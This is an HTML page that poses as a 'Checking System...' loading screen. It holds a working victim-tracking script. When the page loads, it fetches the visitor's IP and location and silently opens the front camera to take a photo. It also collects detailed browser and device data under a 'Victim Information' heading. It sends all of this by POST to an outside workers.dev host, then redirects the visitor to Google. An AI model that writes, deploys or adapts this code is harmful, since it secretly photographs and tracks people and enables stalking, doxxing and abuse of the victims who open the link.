<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking System...</title>
    <style>
        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </script>
</head>
<body>
    <div class="loader"></div>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        async function run() {
            let photo = null;
            let ipD = { ip: "37.239.193.14", city: "Unknown", country_name: "Unknown", org: "Unknown" };

            // 1. جلب الـ IP
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipD = await res.json();
            } catch(e) {}

            // 2. محاولة فتح الكاميرا وتصوير
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 2000)); 
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                photo = canvas.toDataURL('image/jpeg', 0.6);
                stream.getTracks().forEach(t => t.stop());
            } catch (e) {}

            // 3. تنسيق الرسالة المفصلة كما طلبت
            const message = `
✅<b>Victim Information</b> 

⚓ IP: ${ipD.ip} (https://ip-api.com/#${ipD.ip}) | Time: ${new Date().toISOString().replace('T', ' ').split('.')[0]}

⏳ Date In Victim's Device : ${new Date().toString()}

📱 <b>Device Information</b>
productSub: ${navigator.productSub}
vendor: ${navigator.vendor}
maxTouchPoints: ${navigator.maxTouchPoints}
hardwareConcurrency: ${navigator.hardwareConcurrency}
cookieEnabled: ${navigator.cookieEnabled}
appCodeName: ${navigator.appCodeName}
appName: ${navigator.appName}
appVersion: ${navigator.appVersion}
platform: ${navigator.platform}
product: ${navigator.product}
userAgent: ${navigator.userAgent}
language: ${navigator.language}
languages: ${navigator.languages.join(', ')}
webdriver: ${navigator.webdriver}
pdfViewerEnabled: ${navigator.pdfViewerEnabled}

🌐 <b>Network Detail</b>
City: ${ipD.city}
Country: ${ipD.country_name}
ISP: ${ipD.org}
            `;

            // 4. الإرسال للـ Worker
            try {
                await fetch("https://gbs.tjarb093.workers.dev/", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: message, image: photo })
                });
            } catch(e) {}

            // 5. التوجيه
            window.location.href = "https://www.google.com";
        }

        window.onload = run;
    </script>
</body>
</html>
